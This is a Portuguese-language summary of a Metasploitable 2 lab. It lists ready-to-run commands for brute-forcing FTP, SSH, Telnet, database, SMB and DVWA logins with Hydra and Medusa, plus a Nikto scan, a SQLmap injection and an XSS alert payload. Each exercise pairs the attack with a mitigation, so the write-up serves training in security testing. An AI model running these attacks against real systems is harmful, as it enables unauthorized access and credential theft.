Resumo do Laboratório Metasploitable 2
Exercícios realizados
1. Ataque FTP com Medusa
- Comando: medusa -h 192.168.56.103 -u msfadmin -P wordlist.txt -M ftp
- Evidência: ![Evidência FTP](imagenes/ftp.png)
- Esperado: Encontrar credenciais fracas.
- Obtido: Login Successful com usuário msfadmin.
- Mitigação: Desabilitar FTP, usar SFTP, senhas robustas.

2. Ataque SSH com Medusa
- Comando: medusa -h 192.168.56.103 -u msfadmin -P wordlist.txt -M ssh
- Evidência: ![Evidência SSH](imagenes/ssh.png)
- Esperado: Acesso remoto com credenciais fracas.
- Obtido: Login Successful com usuário msfadmin.
- Mitigação: Usar chaves SSH, limitar tentativas, fail2ban.

3. Ataque Telnet com Hydra
- Comando: hydra -l msfadmin -P wordlist.txt 192.168.56.103 telnet
- Evidência: ![Evidência Telnet](imagenes/telnet.png)
- Esperado: Acesso remoto inseguro.
- Obtido: Login Successful com usuário msfadmin.
- Mitigação: Desabilitar Telnet, usar SSH.

4. Ataque MySQL com Medusa/Hydra
- Comando: medusa -h 192.168.56.103 -u root -P wordlist.txt -M mysql
- Comando: hydra -l root -P wordlist.txt 192.168.56.103 mysql
- Evidência: ![Evidência MySQL Medusa](imagenes/mysql-medusa.png)
- Evidência: ![Evidência MySQL Hydra](imagenes/mysql-hydra.png)
- Esperado: Acesso com root remoto.
- Obtido: Falha documentada (root não aceita conexões remotas).
- Mitigação: Manter bloqueado root remoto, usar usuários limitados.

5. Ataque PostgreSQL com Hydra
- Comando: hydra -l postgres -P wordlist.txt 192.168.56.103 postgres
- Evidência: ![Evidência PostgreSQL](imagenes/postgress.png)
- Esperado: Acesso com credenciais padrão.
- Obtido: Login Successful com usuário postgres e senha postgres.
- Mitigação: Alterar credenciais padrão, restringir acessos remotos.

6. Varredura Web com Nikto
- Comando: nikto -h http://192.168.56.103
- Evidência: ![Evidência Nikto](imagenes/nikto.png)
- Esperado: Detectar vulnerabilidades em Apache/PHP.
- Obtido: Diretórios inseguros, aplicações vulneráveis (DVWA, Mutillidae).
- Mitigação: Atualizar servidor, restringir diretórios, WAF.

7. SQL Injection com SQLmap
- Comando: sqlmap -u "http://192.168.56.103/dvwa/vulnerabilities/sqli/?id=2&Submit=Submit" --cookie="PHPSESSID=XXX; security=low" -p id --level=5 --risk=3 --dbs
- Evidência: ![Evidência SQLMap](imagenes/sqlmap.png)
- Esperado: Enumerar bancos de dados.
- Obtido: Bancos listados (dvwa, information_schema).
- Mitigação: Usar consultas parametrizadas, sanitizar entradas.

8. XSS em DVWA
- Payload: <script>alert('XSS');</script>
- Evidência: ![Evidência XSS](imagenes/XSS%20.png)
- Esperado: Executar código no navegador.
- Obtido: Janela emergente com mensagem XSS.
- Mitigação: Escapar entradas, CSP, validação no servidor.

9. Força bruta Login DVWA com Hydra
- Comando: hydra -l admin -P wordlist.txt 192.168.56.103 http-post-form "/dvwa/login.php:username=&password=&Login=Login:Login failed"
- Evidência: ![Evidência Login](imagenes/login.png)
- Esperado: Encontrar senha fraca.
- Obtido: Login Successful com admin:password.
- Mitigação: Limitar tentativas, MFA, senhas robustas.

10. Ataque SMB com Hydra/Medusa
- Comando: hydra -l msfadmin -P wordlist.txt 192.168.56.103 smb
- Comando: medusa -h 192.168.56.103 -u msfadmin -P wordlist.txt -M smbnt
- Evidência: ![Evidência SMB Hydra](imagenes/smb-hydra.png)
- Evidência: ![Evidência SMB Medusa](imagenes/smb-medusa.png)
- Esperado: Acesso compartilhado inseguro.
- Obtido: Login Successful com msfadmin.
- Mitigação: Desabilitar SMBv1, usar SMBv3, segmentar rede.

✅ Conclusão
Este laboratório demonstra como serviços inseguros e aplicações web mal configuradas podem ser explorados facilmente com ferramentas automatizadas (Medusa, Hydra, Nikto, SQLmap). Também evidencia que configurações básicas (como bloquear acessos remotos de root) oferecem proteção. Documentar tanto os ataques bem-sucedidos quanto os falhados fornece uma visão realista da segurança em ambientes de teste.
